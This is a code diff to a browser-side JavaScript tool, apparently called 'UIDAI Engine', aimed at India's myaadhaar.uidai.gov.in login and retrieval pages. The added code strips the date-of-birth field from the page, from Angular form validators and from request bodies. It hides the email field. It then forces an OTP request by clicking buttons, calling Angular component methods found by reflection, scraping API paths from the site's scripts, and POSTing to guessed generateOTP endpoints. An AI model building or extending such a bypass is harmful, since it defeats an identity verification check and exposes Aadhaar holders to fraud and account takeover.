@@ -1,5 +1,5 @@
 /**
- * UIDAI Engine v10.2 — Server-side DOB strip + mode switch bypass
+ * UIDAI Engine v11.0 — OTP pipeline + mobile mode lock (no email toggle spam)
  */
 (function (root, factory) {
   if (typeof module !== 'undefined' && module.exports) {
@@ -11,7 +11,7 @@
   const DISABLED_MARK = 'rebel-dob-disabled';
   const HIDDEN_MARK = 'rebel-dob-hidden';
   const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
-  const ENGINE_VERSION = '10.3.0';
+  const ENGINE_VERSION = '11.0.0';
 
   let dobWatcher = null;
   let watchTimer = null;
@@ -497,24 +497,15 @@
   let lastModeClickAt = 0;
 
   function advancedBypass(uiSel, log) {
-    const now = Date.now();
-    if (!isDobBypassed(uiSel) && now - lastModeClickAt > 3000) {
-      const links = discoverOrLinks(uiSel);
-      const email = links.find((l) => l.kind === 'email');
-      const mobile = links.find((l) => l.kind === 'mobile');
-      if (email) {
-        simulateClick(email.el);
-        lastModeClickAt = now;
-        log?.('info', 'Mode click', email.text);
-      } else if (mobile) {
-        simulateClick(mobile.el);
-        lastModeClickAt = now;
-        log?.('info', 'Mode click', mobile.text);
-      }
+    if (!isDobBypassed(uiSel) && !shouldSkipEmailToggle(uiSel) && Date.now() - lastModeClickAt > 3000) {
+      quickModeSwitch(uiSel, log);
+      lastModeClickAt = Date.now();
     }
-    if (!isDobBypassed(uiSel)) removeDobFromDom(uiSel, log);
-    if (!isDobBypassed(uiSel)) neutralizeDobControls(uiSel, log);
-    if (isDobBypassed(uiSel)) neutralizeEmail(log);
+    if (dobFieldVisible(uiSel)) {
+      removeDobFromDom(uiSel, log);
+      neutralizeDobControls(uiSel, log);
+    }
+    softHideEmailOnly(log);
     enableOtpButtons();
     return {
       dobBypassed: isDobBypassed(uiSel),
@@ -524,10 +515,13 @@
   }
 
   async function advancedBypassAsync(uiSel, log) {
+    await ensureUidaiMobileMode(uiSel, log);
     if (!isDobBypassed(uiSel)) await tryUidaiModeSwitch(uiSel, log);
-    if (!isDobBypassed(uiSel)) removeDobFromDom(uiSel, log);
-    if (!isDobBypassed(uiSel)) neutralizeDobControls(uiSel, log);
-    if (isDobBypassed(uiSel)) neutralizeEmail(log);
+    if (dobFieldVisible(uiSel)) {
+      removeDobFromDom(uiSel, log);
+      neutralizeDobControls(uiSel, log);
+    }
+    softHideEmailOnly(log);
     enableOtpButtons();
     return {
       dobBypassed: isDobBypassed(uiSel),
@@ -536,34 +530,195 @@
     };
   }
 
+  function scanCmpForOtp(cmp, out, seen) {
+    if (!cmp || typeof cmp !== 'object' || seen.has(cmp)) return;
+    seen.add(cmp);
+    const names = new Set([...Object.keys(cmp), ...Object.getOwnPropertyNames(Object.getPrototypeOf(cmp) || {})]);
+    names.forEach((name) => {
+      if (!/otp|send|submit|retrieve|generate|request/i.test(name)) return;
+      if (typeof cmp[name] !== 'function') return;
+      out.push({ cmp, name });
+    });
+  }
+
+  function deepInvokeOtp(btn, log) {
+    const out = [];
+    const seen = new Set();
+    const roots = new Set([btn, ...qAll('app-root, [ng-version], form, mat-form-field, button')]);
+    roots.forEach((el) => {
+      if (!el) return;
+      let cur = el;
+      for (let i = 0; i < 25 && cur; i++, cur = cur.parentElement) {
+        if (typeof window.ng?.getComponent === 'function') {
+          try {
+            scanCmpForOtp(window.ng.getComponent(cur), out, seen);
+          } catch (_e) {}
+        }
+        walkNg(cur, (item) => scanCmpForOtp(item, out, seen));
+      }
+    });
+    const tried = new Set();
+    for (const hit of out) {
+      const key = hit.name;
+      if (tried.has(key)) continue;
+      tried.add(key);
+      try {
+        hit.cmp[hit.name]();
+        log?.('info', 'Angular OTP invoke', key);
+        return true;
+      } catch (_e) {}
+    }
+    return false;
+  }
+
   function triggerAngularOtp(btn, log) {
-    if (!btn) return false;
-    let el = btn;
-    for (let i = 0; i < 20 && el; i++, el = el.parentElement) {
-      if (typeof window.ng?.getComponent === 'function') {
-        try {
-          const cmp = window.ng.getComponent(el);
-          const names = [
-            'sendOtp',
-            'onSendOtp',
-            'generateOtp',
-            'submitForm',
-            'onSubmit',
-            'submit',
-            'requestOtp',
-            'sendOTP',
-          ];
-          for (const n of names) {
-            if (typeof cmp?.[n] === 'function') {
-              cmp[n]();
-              log?.('info', 'OTP Angular method', n);
-              return true;
-            }
-          }
-        } catch (_e) {}
+    return deepInvokeOtp(btn, log);
+  }
+
+  function buildOtpPayload(uiSel) {
+    const snap = getFieldSnapshot(uiSel);
+    const name = snap.find((f) => f.type === 'name')?.val || '';
+    const mobile = snap.find((f) => f.type === 'mobile')?.val || '';
+    const captcha = snap.find((f) => f.type === 'captcha')?.val || '';
+    return {
+      name,
+      fullName: name,
+      mobile,
+      mobileNo: mobile,
+      mobileNumber: mobile,
+      phone: mobile,
+      captcha,
+      captchaCode: captcha,
+      captchaValue: captcha,
+      verifyVia: 'mobile',
+      verificationType: 'mobile',
+      otpType: 'mobile',
+    };
+  }
+
+  async function scrapeChunkEndpoints(log) {
+    const found = new Set();
+    const re = /["'](\/[a-zA-Z0-9_\-./]*(?:otp|OTP|generate|retrieve|send|login)[a-zA-Z0-9_\-./]*)["']/g;
+    qAll('script:not([src])').forEach((s) => {
+      let m;
+      while ((m = re.exec(s.textContent || ''))) {
+        if (m[1].length < 120) found.add(m[1]);
+      }
+    });
+    const srcs = [...document.querySelectorAll('script[src]')]
+      .map((s) => s.src)
+      .filter((u) => u && /myaadhaar|uidai|main|chunk|polyfills|runtime|scripts/i.test(u));
+    for (const url of srcs.slice(0, 10)) {
+      try {
+        const text = await fetch(url, { credentials: 'omit' }).then((r) => r.text());
+        let m;
+        while ((m = re.exec(text))) {
+          if (m[1].length < 120) found.add(m[1]);
+        }
+      } catch (_e) {}
+    }
+    const list = [...found].slice(0, 20);
+    if (list.length) log?.('info', 'Scraped API paths', list);
+    return list;
+  }
+
+  const DEFAULT_OTP_PATHS = [
+    '/auth/login/generateOTP',
+    '/api/auth/login/generateOTP',
+    '/api/auth/generateOtp',
+    '/api/login/generateOtp',
+    '/login/generateOtp',
+    '/retrieve/generateOtp',
+    '/api/retrieve/generateOtp',
+    '/retrieveAadhaar/generateOtp',
+    '/generic/generateOtp',
+    '/sso/login/generateOtp',
+  ];
+
+  async function directOtpRequest(uiSel, log, extraPaths) {
+    const data = buildOtpPayload(uiSel);
+    if (!data.mobile || !data.captcha) {
+      log?.('warn', 'Direct OTP skip — mobile/captcha missing');
+      return false;
+    }
+    const paths = [...new Set([...(extraPaths || []), ...DEFAULT_OTP_PATHS])];
+    const bases = [location.origin, 'https://myaadhaar.uidai.gov.in'];
+    const bodies = [
+      data,
+      { fullName: data.name, mobileNo: data.mobile, captcha: data.captcha },
+      { name: data.name, mobileNumber: data.mobile, captchaValue: data.captcha },
+    ];
+    for (const base of bases) {
+      for (const path of paths) {
+        if (!path || path.length < 4) continue;
+        const url = path.startsWith('http') ? path : base + path;
+        for (const body of bodies) {
+          const stripped = stripDobFromBody(JSON.stringify(body));
+          const payload = typeof stripped.body === 'string' ? stripped.body : JSON.stringify(stripped.body);
+          try {
+            const res = await fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/plain, */*' },
+              body: payload,
+              credentials: 'include',
+            });
+            if (res.status === 404 || res.status === 405) continue;
+            const text = await res.text().catch(() => '');
+            log?.('info', 'Direct OTP API', { url: url.slice(0, 100), status: res.status, resp: text.slice(0, 100) });
+            if (res.ok) return true;
+          } catch (_e) {}
+        }
       }
     }
     return false;
+  }
+
+  async function invokeOtpPipeline(btn, uiSel, log, netBefore) {
+    await advancedBypassAsync(uiSel, log);
+    const prep = buildSubmitState(uiSel, log);
+    if (!prep.dobBypassed) {
+      log?.('error', 'DOB bypass fail', prep);
+      return { ok: false, prep };
+    }
+    if (!prep.formOk) {
+      log?.('error', 'Form incomplete', prep.after?.fields);
+      return { ok: false, prep };
+    }
+
+    log?.('info', 'OTP pipeline start', { v: ENGINE_VERSION });
+
+    enableOtpButtons();
+    try {
+      btn.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
+    } catch (_e) {}
+    try {
+      btn.click();
+    } catch (_e2) {}
+    await waitMs(2200);
+    if (typeof netBefore === 'function' && netBefore()) {
+      return { ok: true, prep, via: 'native-click' };
+    }
+
+    forceSubmitOtp(btn, log);
+    await waitMs(2000);
+    if (typeof netBefore === 'function' && netBefore()) {
+      return { ok: true, prep, via: 'force-click' };
+    }
+
+    if (deepInvokeOtp(btn, log)) {
+      await waitMs(2200);
+      if (typeof netBefore === 'function' && netBefore()) {
+        return { ok: true, prep, via: 'angular' };
+      }
+    }
+
+    const paths = await scrapeChunkEndpoints(log);
+    if (await directOtpRequest(uiSel, log, paths)) {
+      return { ok: true, prep, via: 'direct-api' };
+    }
+
+    log?.('error', 'OTP pipeline fail — sab try ho gaya');
+    return { ok: false, prep };
   }
 
   function forceSubmitOtp(btn, log) {
@@ -587,33 +742,48 @@
     return true;
   }
 
-  function neutralizeEmail(log) {
-    let n = 0;
-    getMatFields().forEach((f) => {
-      if (classifyField(f) !== 'email') return;
-      const input = f.input;
-      input.disabled = true;
-      input.removeAttribute('required');
-      input.setAttribute('aria-required', 'false');
-      input.setCustomValidity?.('');
-      input.dataset.rebelEmailOff = '1';
-      n += 1;
-    });
-    collectFormGroups().forEach((form) => {
-      if (!form.controls) return;
-      Object.entries(form.controls).forEach(([key, ctrl]) => {
-        if (!/email/i.test(key)) return;
-        ctrl.clearValidators?.();
-        ctrl.setErrors?.(null);
-        try {
-          ctrl.disable({ emitEvent: false });
-        } catch (_e) {}
-      });
-      form.updateValueAndValidity?.({ emitEvent: false });
-    });
+  /** Sirf CSS hide — disable NAHI (Angular form break hota hai) */
+  function softHideEmailOnly(log) {
+    const blocks = findEmailBlocks();
+    if (!blocks.length) return 0;
     hideEmail(null, log);
-    if (n) log?.('info', 'Email neutralized', { count: n });
-    return n;
+    return blocks.length;
+  }
+
+  function neutralizeEmail(log) {
+    return softHideEmailOnly(log);
+  }
+
+  function mobileFieldFilled(uiSel) {
+    const snap = getFieldSnapshot(uiSel);
+    return !!snap.find((f) => f.type === 'mobile' && f.ok);
+  }
+
+  function shouldSkipEmailToggle(uiSel) {
+    return mobileFieldFilled(uiSel) && isDobBypassed(uiSel);
+  }
+
+  async function ensureUidaiMobileMode(uiSel, log) {
+    if (shouldSkipEmailToggle(uiSel)) {
+      log?.('info', 'Mobile mode locked — toggle clicks skip', {});
+      softHideEmailOnly(log);
+      return true;
+    }
+    const email = discoverOrLinks(uiSel).find((l) => l.kind === 'email');
+    if (email) {
+      log?.('info', 'UIDAI: email mode switch', email.text);
+      simulateClick(email.el);
+      await waitMs(1600);
+    }
+    const mobile = discoverOrLinks(uiSel).find(
+      (l) => l.kind === 'mobile' || (/enter\s*mobile/i.test(l.text) && isLinkish(l.el))
+    );
+    if (mobile) {
+      log?.('info', 'UIDAI: mobile mode switch', mobile.text);
+      simulateClick(mobile.el);
+      await waitMs(1600);
+    }
+    return true;
   }
 
   /** Bypass = DOB screen/form se hat gaya (DOM me ho sakta hai par UIDAI ne hide/remove kiya) */
@@ -640,6 +810,10 @@
 
   /** OR Email → OR Mobile (ya sirf OR Mobile) — UIDAI native mode switch */
   function quickModeSwitch(uiSel, log) {
+    if (shouldSkipEmailToggle(uiSel)) {
+      log?.('info', 'quickModeSwitch skip — mobile active', {});
+      return { email: false, mobile: true, found: 0, skipped: true };
+    }
     const links = discoverOrLinks(uiSel);
     const email = links.find((l) => l.kind === 'email');
     const mobile = links.find((l) => l.kind === 'mobile');
@@ -658,10 +832,13 @@
   }
 
   function ensureMobileModeSync(uiSel, log) {
+    if (shouldSkipEmailToggle(uiSel)) {
+      softHideEmailOnly(log);
+      return true;
+    }
     if (getDobInputs().length) quickModeSwitch(uiSel, log);
-    const mobile = findOrMobileLink(uiSel);
-    if (mobile && isVisible(mobile, uiSel)) simulateClick(mobile);
-    return neutralizeEmail(log) > 0 || !!mobile;
+    softHideEmailOnly(log);
+    return true;
   }
 
   function walkNg(el, fn) {
@@ -1086,6 +1263,12 @@
   async function tryUidaiModeSwitch(uiSel, log) {
     if (isDobBypassed(uiSel)) return true;
 
+    if (shouldSkipEmailToggle(uiSel)) {
+      log?.('info', 'Mode switch skip — mobile filled + DOB bypassed', {});
+      softHideEmailOnly(log);
+      return true;
+    }
+
     const links = discoverOrLinks(uiSel);
     log?.('info', 'OR links scan', links.map((l) => l.text));
 
@@ -1319,6 +1502,9 @@
     getFieldSnapshot,
     ensureMobileModeSync,
     neutralizeEmail,
+    softHideEmailOnly,
+    ensureUidaiMobileMode,
+    shouldSkipEmailToggle,
     readInputVal,
     isDobHidden,
     isDobDisabled,
@@ -1339,6 +1525,10 @@
     advancedBypassAsync,
     forceSubmitOtp,
     triggerAngularOtp,
+    deepInvokeOtp,
+    scrapeChunkEndpoints,
+    directOtpRequest,
+    invokeOtpPipeline,
     installNetworkBypass,
     stripDobDeep,
     stripDobFromBody,
